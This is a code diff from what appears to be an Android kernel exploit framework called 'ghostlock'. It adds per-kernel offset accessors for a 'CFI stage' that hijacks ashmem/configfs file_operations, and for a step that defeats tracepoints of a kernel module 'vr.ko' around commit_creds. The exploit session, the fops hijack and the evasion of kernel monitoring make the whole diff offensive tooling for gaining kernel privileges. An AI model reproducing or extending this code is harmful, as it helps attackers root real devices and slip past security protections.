@@ -19,6 +19,13 @@ namespace ghostlock::profile {
                                  fallback);
     }
 
+    /* Same contract as symbol_u32, for the 64-bit kernel-section fields. */
+    template<typename F>
+    inline uint64_t symbol_u64(F get, uint64_t fallback) {
+        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
+        return values ? get(*values) : fallback;
+    }
+
     template<typename F>
     inline uint64_t symbol_image(F get, uint64_t fallback) {
         return ghostlock::kernel::KIMAGE_TEXT_BASE +
@@ -169,6 +176,150 @@ namespace ghostlock::profile {
     inline uint32_t task_seccomp_off() {
         return symbol_u32(
             [](const kernel_offsets &v) { return v.task.seccomp; }, 0x9C8);
+    }
+
+    /* ---------------------------------------------------------------------
+ * CFI stage (fops hijack) per-kernel constants, all absent by default: a
+ * device without them reports 0 and the CFI stage refuses to run rather than
+ * writing a guessed address. Values come from the profile `kernel` section.
+ * ------------------------------------------------------------------- */
+    inline uintptr_t ashmem_misc_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemMiscOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_misc_fops_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemMiscFopsOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_fops_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemFopsOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_ioctl_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemIoctlOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_compat_ioctl_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemCompatIoctlOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_mmap_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemMmapOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_open_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemOpenOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_release_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemReleaseOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t ashmem_show_fdinfo_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.ashmemShowFdinfoOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t configfs_read_iter_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.configfsReadIterOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t configfs_bin_read_iter_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.configfsBinReadIterOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t configfs_bin_write_iter_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.configfsBinWriteIterOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t copy_splice_read_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.copySpliceReadOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t noop_llseek_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.noopLlseekOff.value_or(0);
+        }, 0);
+    }
+
+    /* ---- 第三步：反 vr.ko 的 tracepoint 常量 ---- */
+    inline uintptr_t sys_exit_tp_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.sysExitTpOff.value_or(0);
+        }, 0);
+    }
+
+    inline uintptr_t rvh_commit_creds_tp_image() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.rvhCommitCredsTpOff.value_or(0);
+        }, 0);
+    }
+
+    inline size_t tracepoint_probestub_off() {
+        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
+            return v.misc.tracepointProbestubOff.value_or(0);
+        }, 0));
+    }
+
+    inline size_t tracepoint_funcs_off() {
+        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
+            return v.misc.tracepointFuncsOff.value_or(0);
+        }, 0));
+    }
+
+    inline size_t tracepoint_func_stride() {
+        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
+            return v.misc.tracepointFuncStride.value_or(0);
+        }, 0));
+    }
+
+    inline uint64_t vr_commit_to_sysexit_delta() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.vrCommitToSysexitDelta.value_or(0);
+        }, 0);
+    }
+
+    /* 内核镜像的地址上界。profile 的 vr_kernel_image_max 只是量级上限，
+     * 精确值应该用 boot.img 里 arm64 Image 头声明的 image_size；调用方在
+     * 拿不到精确值时才退回这个。 */
+    inline uint64_t vr_kernel_image_max() {
+        return symbol_u64([](const kernel_offsets &v) {
+            return v.misc.vrKernelImageMax.value_or(0);
+        }, 0);
+    }
+
+    /* The `kernel` section keys the CFI stage cannot work without. */
+    inline bool cfi_constants_present() {
+        return ashmem_misc_fops_image() != 0 &&
+               ashmem_fops_image() != 0 &&
+               configfs_bin_read_iter_image() != 0 &&
+               configfs_bin_write_iter_image() != 0 &&
+               noop_llseek_image() != 0;
     }
 } // namespace ghostlock::profile
 
